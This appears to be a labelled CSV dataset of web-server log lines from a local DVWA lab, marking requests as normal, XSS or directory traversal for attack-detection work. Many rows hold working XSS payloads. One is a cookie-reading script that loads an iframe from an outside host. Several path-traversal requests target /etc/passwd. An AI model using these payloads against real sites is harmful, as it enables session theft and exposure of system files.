,url,normal,xss,dir
3107,"127.0.0.1 - - [03/May/2021:03:08:06 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=start HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
14168,"127.0.0.1 - - [03/May/2021:03:18:43 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Joby HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
2709,"127.0.0.1 - - [03/May/2021:03:22:43 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Mora HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
16726,"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a href=\""\\xE2\\x80\\x81javascript:javascript:alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
394,"127.0.0.1 - - [03/May/2021:02:34:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a href=\""javas\\x00cript:javascript:alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
4007,"127.0.0.1 - - [03/May/2021:03:28:10 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Vmcord HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
4465,"127.0.0.1 - - [28/Apr/2021:22:30:45 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
1471,"127.0.0.1 - - [03/May/2021:03:40:45 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<frameset draggable=\""true\"""" 400 0 ""-"" ""-""",0,1,0
3617,"127.0.0.1 - - [03/May/2021:10:05:53 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
14700,"127.0.0.1 - - [03/May/2021:03:21:46 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Marjet HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
5777,"127.0.0.1 - - [03/May/2021:03:41:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<textarea autofocus"" 400 0 ""-"" ""-""",0,1,0
10560,"127.0.0.1 - - [03/May/2021:03:12:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Camilla HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
6366,"127.0.0.1 - - [03/May/2021:10:23:33 -0400] ""GET /DVWA/vulnerabilities/fi/?page=announcements.php HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
64,"127.0.0.1 - - [03/May/2021:03:41:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<video onmousemove=\""alert(1)\"">test</video>"" 400 0 ""-"" ""-""",0,1,0
10715,"127.0.0.1 - - [03/May/2021:03:41:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<var onmouseover=\""prompt(1)\"">On"" 400 0 ""-"" ""-""",0,1,0
14865,"127.0.0.1 - - [03/May/2021:03:24:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ransom HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
3147,"127.0.0.1 - - [03/May/2021:02:35:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=&lt;IFRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt;"" 400 0 ""-"" ""-""",0,1,0
7806,"127.0.0.1 - - [03/May/2021:02:34:51 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a href=\""\\x12javascript:javascript:alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
4533,"127.0.0.1 - - [03/May/2021:03:40:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<label onblur=alert(1)"" 400 0 ""-"" ""-""",0,1,0
477,"127.0.0.1 - - [03/May/2021:03:41:35 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<video onclick=\""alert(1)\"">test</video>"" 400 0 ""-"" ""-""",0,1,0
15677,"127.0.0.1 - - [03/May/2021:03:40:51 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ins onkeydown=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
8764,"127.0.0.1 - - [03/May/2021:03:14:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Demi HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
11781,"127.0.0.1 - - [03/May/2021:03:06:20 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=fourier HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
18529,"127.0.0.1 - - [03/May/2021:03:18:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Jeane HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
9737,"127.0.0.1 - - [03/May/2021:03:21:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Mahalia HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
11204,"127.0.0.1 - - [03/May/2021:03:12:52 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Celesta HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
13076,"127.0.0.1 - - [03/May/2021:03:28:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Wandie HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
18046,"127.0.0.1 - - [28/Apr/2021:21:58:21 -0400] ""GET /DVWA/login.php HTTP/1.1"" 200 1015 ""http://127.0.0.1/DVWA/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
5022,"127.0.0.1 - - [03/May/2021:03:41:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<--`<img/src=` onerror=alert(1)>"" 400 0 ""-"" ""-""",0,1,0
1771,"127.0.0.1 - - [03/May/2021:03:23:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Nico HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
19807,"127.0.0.1 - - [03/May/2021:03:10:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Alfie HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
960,"127.0.0.1 - - [03/May/2021:03:10:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Antonetta HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
13353,"127.0.0.1 - - [03/May/2021:03:18:58 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Jude HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
358,"127.0.0.1 - - [03/May/2021:03:25:47 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Seyar HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
1637,"127.0.0.1 - - [03/May/2021:03:26:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Sophey HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
2865,"127.0.0.1 - - [03/May/2021:03:41:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<source onkeypress=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
7151,"127.0.0.1 - - [03/May/2021:03:40:43 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<figcaption onmouseenter=\""alert(1)\"">test</figcaption>"" 400 0 ""-"" ""-""",0,1,0
9167,"127.0.0.1 - - [03/May/2021:03:06:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=docs HTTP/1.1"" 200 1695 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
10114,"127.0.0.1 - - [03/May/2021:03:41:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<source draggable=\""true\"""" 400 0 ""-"" ""-""",0,1,0
7816,"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=\""><img src=x"" 400 0 ""-"" ""-""",0,1,0
15109,"127.0.0.1 - - [03/May/2021:03:10:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Alane HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
11954,"127.0.0.1 - - [03/May/2021:03:40:20 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=(alert)(1) HTTP/1.1"" 200 1701 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,1,0
2261,"127.0.0.1 - - [03/May/2021:03:41:37 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>Object.defineProperty(parent,'Safe',{value:{}});Object.defineProperty(parent.Safe,'get',{value:function(){return top.document.cookie}});alert(parent.Safe.get())<\\/script>%22)};document.body.appendChild(x);</script>"" 400 0 ""-"" ""-""",0,1,0
13971,"127.0.0.1 - - [03/May/2021:03:05:41 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=cmd HTTP/1.1"" 200 1695 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
17508,"127.0.0.1 - - [03/May/2021:03:15:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Fariba HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
12662,"127.0.0.1 - - [03/May/2021:03:07:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=mitjans HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
11201,"127.0.0.1 - - [03/May/2021:03:40:21 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<address draggable=\""true\"""" 400 0 ""-"" ""-""",0,1,0
4048,"127.0.0.1 - - [03/May/2021:03:41:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<pre id=x"" 400 0 ""-"" ""-""",0,1,0
17686,"127.0.0.1 - - [03/May/2021:10:06:28 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/etc/passwd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
5201,"127.0.0.1 - - [03/May/2021:03:06:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=leer HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
17343,"127.0.0.1 - - [03/May/2021:03:24:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Reagan HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
11545,"127.0.0.1 - - [03/May/2021:03:24:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Rayna HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
4788,"127.0.0.1 - - [03/May/2021:03:22:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Murat HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
17657,"127.0.0.1 - - [03/May/2021:10:06:27 -0400] ""GET /DVWA/vulnerabilities/fi/?page=..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
13599,"127.0.0.1 - - [03/May/2021:03:40:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div draggable=\""true\"""" 400 0 ""-"" ""-""",0,1,0
7938,"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<SCRIPT =\"">\"""" 400 0 ""-"" ""-""",0,1,0
12665,"127.0.0.1 - - [03/May/2021:03:21:10 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Lynne HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
17510,"127.0.0.1 - - [03/May/2021:03:40:26 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<bdo onmousemove=\""alert(1)\"">test</bdo>"" 400 0 ""-"" ""-""",0,1,0
16523,"127.0.0.1 - - [03/May/2021:03:13:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Chick HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
13173,"127.0.0.1 - - [03/May/2021:03:21:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Marcia HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
1885,"127.0.0.1 - - [03/May/2021:03:40:47 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<head onmousemove=\""alert(1)\"">test</head>"" 400 0 ""-"" ""-""",0,1,0
1409,"127.0.0.1 - - [03/May/2021:03:24:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Quentin HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
12931,"127.0.0.1 - - [03/May/2021:03:06:46 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=kept HTTP/1.1"" 200 1695 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
12311,"127.0.0.1 - - [03/May/2021:03:07:41 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=really HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
15031,"127.0.0.1 - - [03/May/2021:03:40:47 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<head onmouseover=\""alert(1)\"">test</head>"" 400 0 ""-"" ""-""",0,1,0
9599,"127.0.0.1 - - [03/May/2021:03:40:28 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<button id=x"" 400 0 ""-"" ""-""",0,1,0
14326,"127.0.0.1 - - [03/May/2021:03:17:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ha HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
1741,"127.0.0.1 - - [03/May/2021:03:12:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Brandy HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
13068,"127.0.0.1 - - [03/May/2021:03:41:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<OBJECT TYPE=\""text/x-scriptlet\"""" 400 0 ""-"" ""-""",0,1,0
13770,"127.0.0.1 - - [03/May/2021:03:07:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=oculto HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
11401,"127.0.0.1 - - [03/May/2021:02:34:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=\""`'><script>\\x0Cjavascript:alert(1)</script> HTTP/1.1"" 200 1716 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,1,0
4978,"127.0.0.1 - - [03/May/2021:03:18:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Janifer HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
7024,"127.0.0.1 - - [03/May/2021:10:05:41 -0400] ""GET /DVWA/vulnerabilities/fi/?page=..%252f..%252f..%252f..%252f..%252f..%252fetc%252passwd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
4918,"127.0.0.1 - - [03/May/2021:02:34:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img/&#09;&#10;&#11; src=`~`"" 400 0 ""-"" ""-""",0,1,0
11997,"127.0.0.1 - - [03/May/2021:03:14:58 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Eddy HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
1398,"127.0.0.1 - - [03/May/2021:03:27:04 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Teresina HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
10954,"127.0.0.1 - - [03/May/2021:03:11:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ardra HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
12213,"127.0.0.1 - - [03/May/2021:03:23:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Natasha HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
18371,"127.0.0.1 - - [03/May/2021:03:07:26 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=perfil HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
20336,"127.0.0.1 - - [03/May/2021:03:41:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style>@keyframes x{}</style><nextid"" 400 0 ""-"" ""-""",0,1,0
4061,"127.0.0.1 - - [03/May/2021:03:10:42 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Anantha HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
11743,"127.0.0.1 - - [03/May/2021:03:14:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Dionne HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
19745,"127.0.0.1 - - [03/May/2021:03:28:45 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Zaihua HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
10097,"127.0.0.1 - - [03/May/2021:03:21:51 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Marloes HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
5271,"127.0.0.1 - - [03/May/2021:03:23:26 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Nonie HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
13277,"127.0.0.1 - - [03/May/2021:03:27:21 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Timmi HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
12241,"127.0.0.1 - - [03/May/2021:02:35:18 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<meta HTTP-EQUIV=\""Link\"""" 400 0 ""-"" ""-""",0,1,0
5032,"127.0.0.1 - - [03/May/2021:03:26:00 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Shekhar HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
9731,"127.0.0.1 - - [03/May/2021:03:40:43 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<fieldset id=x"" 400 0 ""-"" ""-""",0,1,0
2601,"127.0.0.1 - - [03/May/2021:10:23:56 -0400] ""GET /DVWA/vulnerabilities/fi/?page=engine.php HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
6077,"127.0.0.1 - - [03/May/2021:02:35:18 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"" 400 0 ""-"" ""-""",0,1,0
18776,"127.0.0.1 - - [03/May/2021:03:40:41 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<dt draggable=\""true\"""" 400 0 ""-"" ""-""",0,1,0
4367,"127.0.0.1 - - [03/May/2021:03:40:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<kbd oncontextmenu=\""alert(1)\"">test</kbd>"" 400 0 ""-"" ""-""",0,1,0
15301,"127.0.0.1 - - [03/May/2021:03:18:08 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Jacklin HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
